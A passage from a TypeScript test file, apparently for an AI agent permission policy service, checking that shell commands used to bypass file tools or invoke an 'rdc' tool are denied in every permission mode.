      permissionSettings: { mode: 'auto-review', readableRoots: [], writableRoots: [], allowedCommandPrefixes: [], deniedCommandPrefixes: [] } }).action).toBe('deny');
    ownership.lease.mockReturnValue({ ...lease, version: 8 });
    expect(evaluate().action).toBe('deny');
  });
  it.each(['default', 'auto-review', 'full-access', 'custom'] as const)('%s cannot allow file or RDC bypass', mode => {
    for (const command of ['rg pattern', 'Get-Content file', 'type file', 'rdc-tool version']) {
      const decision = new AgentPermissionPolicyService().evaluate({
        tool: shellTool, toolCall: { type: 'toolCall', id: 'route', name: 'shell', arguments: { command } },
        agentId: 'general', effectiveToolNames: ['read_file', 'grep'],
        permissionSettings: { mode, readableRoots: [], writableRoots: [], allowedCommandPrefixes: [command], deniedCommandPrefixes: [] },
      });
      expect(decision.action).toBe('deny');
      expect(decision.reason).toContain(command.startsWith('rdc') ? 'RDC_VIA_COMMAND_DENIED' : 'SHELL_FILE_TOOL_BYPASS');
    }
  });
});
